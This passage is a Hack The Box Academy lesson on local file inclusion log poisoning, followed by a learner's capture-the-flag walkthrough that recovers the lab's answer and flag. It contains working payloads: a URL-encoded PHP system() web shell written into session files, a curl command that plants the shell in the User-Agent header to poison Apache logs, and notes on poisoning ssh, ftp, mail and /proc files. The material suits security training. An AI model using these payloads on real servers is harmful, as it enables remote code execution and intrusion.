We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has theÂ `Execute`Â privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e.Â `poison`/`contaminate`Â the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

As was the case in the previous section, any of the following functions withÂ `Execute`Â privileges should be vulnerable to these attacks:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|âœ…|âœ…|âœ…|
|`require()`/`require_once()`|âœ…|âœ…|âŒ|
|**NodeJS**||||
|`res.render()`|âœ…|âœ…|âŒ|
|**Java**||||
|`import`|âœ…|âœ…|âœ…|
|**.NET**||||
|`include`|âœ…|âœ…|âœ…|

---

## PHP Session Poisoning

Most PHP web applications utilizeÂ `PHPSESSID`Â cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored inÂ `session`Â files on the back-end, and saved inÂ `/var/lib/php/sessions/`Â on Linux and inÂ `C:\Windows\Temp\`Â on Windows. The name of the file that contains our user's data matches the name of ourÂ `PHPSESSID`Â cookie with theÂ `sess_`Â prefix. For example, if theÂ `PHPSESSID`Â cookie is set toÂ `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would beÂ `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have aÂ `PHPSESSID`Â cookie set to our session:Â 

![image](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

As we can see, ourÂ `PHPSESSID`Â cookie value isÂ `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored atÂ `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)

**Note:**Â As you may easily guess, the cookie value will differ from one session to another, so you need to use the cookie value you find in your own session to perform the same attack.

We can see that the session file contains two values:Â `page`, which shows the selected language page, andÂ `preference`, which shows the selected language. TheÂ `preference`Â value is not under our control, as we did not specify it anywhere and must be automatically specified. However, theÂ `page`Â value is under our control, as we can control it through theÂ `?language=`Â parameter.

Let's try setting the value ofÂ `page`Â a custom value (e.g.Â `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page withÂ `?language=session_poisoning`Â specified, as follows:


```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)

This time, the session file containsÂ `session_poisoning`Â instead ofÂ `es.php`, which confirms our ability to control the value ofÂ `page`Â in the session file. Our next step is to perform theÂ `poisoning`Â step by writing PHP code to the session file. We can write a basic PHP web shell by changing theÂ `?language=`Â parameter to a URL encoded web shell, as follows:


```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use theÂ `&cmd=id`Â to execute a commands:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)

Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten withÂ `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`Â after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

---

## Server Log Poisoning

BothÂ `Apache`Â andÂ `Nginx`Â maintain various log files, such asÂ `access.log`Â andÂ `error.log`. TheÂ `access.log`Â file contains various information about all requests made to the server, including each request'sÂ `User-Agent`Â header. As we can control theÂ `User-Agent`Â header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs.Â `Nginx`Â logs are readable by low privileged users by default (e.g.Â `www-data`), while theÂ `Apache`Â logs are only readable by users with high privileges (e.g.Â `root`/`adm`Â groups). However, in older or misconfiguredÂ `Apache`Â servers, these logs may be readable by low-privileged users.

By default,Â `Apache`Â logs are located inÂ `/var/log/apache2/`Â on Linux and inÂ `C:\xampp\apache\logs\`Â on Windows, whileÂ `Nginx`Â logs are located inÂ `/var/log/nginx/`Â on Linux and inÂ `C:\nginx\log\`Â on Windows. However, the logs may be in a different location in some cases, so we may use anÂ [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)Â to fuzz for their locations, as will be discussed in the next section.

So, let's try including the Apache access log fromÂ `/var/log/apache2/access.log`, and see what we get:


```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

![](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)

As we can see, we can read the log. The log contains theÂ `remote IP address`,Â `request page`,Â `response code`, and theÂ `User-Agent`Â header. As mentioned earlier, theÂ `User-Agent`Â header is controlled by us through the HTTP request headers, so we should be able to poison this value.

**Tip:**Â Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

To do so, we will useÂ `Burp Suite`Â to intercept our earlier LFI request and modify theÂ `User-Agent`Â header toÂ `Apache Log Poisoning`:Â 

![image](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

**Note:**Â As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.

As expected, our custom User-Agent value is visible in the included log file. Now, we can poison theÂ `User-Agent`Â header by setting it to a basic PHP web shell:Â 

![image](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

We may also poison the log by sending a request through cURL, as follows:


```shell-session
smoothment@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`):Â 

![image](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

We see that we successfully executed the command. The exact same attack can be carried out onÂ `Nginx`Â logs as well.

**Tip:**Â TheÂ `User-Agent`Â header is also shown on process files under the LinuxÂ `/proc/`Â directory. So, we can try including theÂ `/proc/self/environ`Â orÂ `/proc/self/fd/N`Â files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if theÂ `ssh`Â orÂ `ftp`Â services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies theÂ `mail`Â services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

# Questions
---

![Pasted image 20250218153924.png](../../../../IMAGES/Pasted%20image%2020250218153924.png)

Let's begin by viewing the website:

![Pasted image 20250218165111.png](../../../../IMAGES/Pasted%20image%2020250218165111.png)

Same as the previous one, let's send the request and perform the php session poisoning to check if it works:

![Pasted image 20250218165138.png](../../../../IMAGES/Pasted%20image%2020250218165138.png)

We are able to read the session, now, let's change the value and check again:

![Pasted image 20250218165218.png](../../../../IMAGES/Pasted%20image%2020250218165218.png)

If we check again:

```
/var/lib/php/sessions/sess_5lpvtk301qthsd578ihq05f63r
```

![Pasted image 20250218165244.png](../../../../IMAGES/Pasted%20image%2020250218165244.png)

We can see it changed, which means we are able to perform this action, let's change it to a webshell:

```
language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

And check again using the `cmd` parameter:

```
/var/lib/php/sessions/sess_5lpvtk301qthsd578ihq05f63r&cmd=id
```

![Pasted image 20250218165503.png](../../../../IMAGES/Pasted%20image%2020250218165503.png)

We got `RCE`, let's answer the questions:

```
pwd

/var/www/html
```

Answer is:

```
/var/www/html
```

Now, let's search for the flag:

```
ls+/

bin
boot
c85ee5082f4c723ace6c0796e3a3db09.txt
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Got it, let's read it:

![Pasted image 20250218170217.png](../../../../IMAGES/Pasted%20image%2020250218170217.png)

Got our flag:

```
HTB{1095_5#0u1d_n3v3r_63_3xp053d}
```

